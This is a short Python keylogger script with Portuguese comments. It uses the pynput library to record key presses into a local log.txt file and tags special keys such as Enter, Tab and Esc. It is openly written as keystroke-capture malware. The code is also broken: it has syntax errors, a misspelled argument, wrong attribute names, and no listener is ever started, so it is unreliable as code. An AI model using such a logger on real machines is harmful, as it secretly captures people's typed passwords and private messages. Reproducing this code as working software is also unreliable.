from pynput import keyboard

IGNORAR = {  
  keyboard.key.shift,
  keyboard.key.shift_r,
  keyboard.key.ctrl_l,
  keyboard.key.ctrl_r,
  keyboard.key.alt_l,
  keyboard.key.alt_r,
  keyboard.key.cap_lock,
  keyboard.key.cmd
}

def on_press(key):
  try
    #Se for uma tecla normal
    with open("log.txt", "a", enconding="utf-8") as f:
      f.write(key.char)
      
  except AttributeError:
    with open("log.txt", "a", enconding="utf-8") as f:
      if key == keyboard.keyspace:
        f.write(" ")
      elif key == keyboard.key.enter:
        f.write("\n")
      elif key == keyboard.key.tab:
        f.write("\t")
      elif key == keyboard.key.backspace:
        f.write(" ")
      elif key == keyboard.key.esc:
        f.write(" [ESC] ")
      elif key in IGNORAR:
        pass
      else:
        f.write(f"[{key}] ")
